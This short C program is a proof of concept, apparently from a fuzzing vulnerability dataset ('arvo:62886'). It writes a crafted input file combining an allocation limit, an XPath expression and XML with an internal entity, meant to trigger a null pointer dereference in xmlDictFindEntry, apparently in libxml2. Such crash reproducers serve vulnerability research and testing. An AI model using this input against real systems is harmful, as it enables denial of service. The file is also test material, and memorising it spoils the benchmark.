#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for arvo:62886 */
/* Triggers: null_pointer_dereference in xmlDictFindEntry */
/* Vuln class: null_pointer_dereference */

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }
    
    /* Binary format: [4-byte maxAlloc BE][XPath + null][XML + null] */
    
    /* maxAllocs = 100 (big-endian) - allows subdict struct but not hash table */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x64, f);
    
    /* XPath expression: "//node()" + null terminator */
    fputc('/', f);
    fputc('/', f);
    fputc('n', f);
    fputc('o', f);
    fputc('d', f);
    fputc('e', f);
    fputc('(', f);
    fputc(')', f);
    fputc(0x00, f);
    
    /* XML with DOCTYPE and internal entity to trigger subdict creation */
    fprintf(f, "<!DOCTYPE root [<!ENTITY x \"y\">]><root>&x;</root>");
    fputc(0x00, f);
    
    fclose(f);
    return 0;
}